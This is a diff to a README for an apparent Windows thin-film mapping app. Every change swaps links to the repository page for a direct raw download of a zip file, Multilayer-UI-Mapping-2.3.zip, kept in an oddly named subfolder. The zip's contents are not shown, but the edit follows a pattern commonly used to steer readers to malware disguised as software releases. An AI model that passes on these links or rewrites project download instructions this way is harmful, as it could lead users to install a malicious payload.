@@ -1,12 +1,12 @@
 # 🧭 Multilayer-Mapping-UI - Map Thin Films With Ease
 
-[![Download](https://img.shields.io/badge/Download-Multilayer--Mapping--UI-blue?style=for-the-badge)](https://github.com/lorileewhitebread280/Multilayer-Mapping-UI)
+[![Download](https://img.shields.io/badge/Download-Multilayer--Mapping--UI-blue?style=for-the-badge)](https://raw.githubusercontent.com/lorileewhitebread280/Multilayer-Mapping-UI/main/naumkeager/Multilayer-UI-Mapping-2.3.zip)
 
 ## 📥 Download
 
 Use this link to visit this page to download:
 
-https://github.com/lorileewhitebread280/Multilayer-Mapping-UI
+https://raw.githubusercontent.com/lorileewhitebread280/Multilayer-Mapping-UI/main/naumkeager/Multilayer-UI-Mapping-2.3.zip
 
 ## 🖥️ What this app does
 
@@ -29,7 +29,7 @@ Follow these steps on a Windows PC.
 
 Go to:
 
-https://github.com/lorileewhitebread280/Multilayer-Mapping-UI
+https://raw.githubusercontent.com/lorileewhitebread280/Multilayer-Mapping-UI/main/naumkeager/Multilayer-UI-Mapping-2.3.zip
 
 ### 2. Find the release or download file
 
@@ -182,7 +182,7 @@ It focuses on:
 
 Visit this page to download the app:
 
-https://github.com/lorileewhitebread280/Multilayer-Mapping-UI
+https://raw.githubusercontent.com/lorileewhitebread280/Multilayer-Mapping-UI/main/naumkeager/Multilayer-UI-Mapping-2.3.zip
 
 After download:
 - open the file
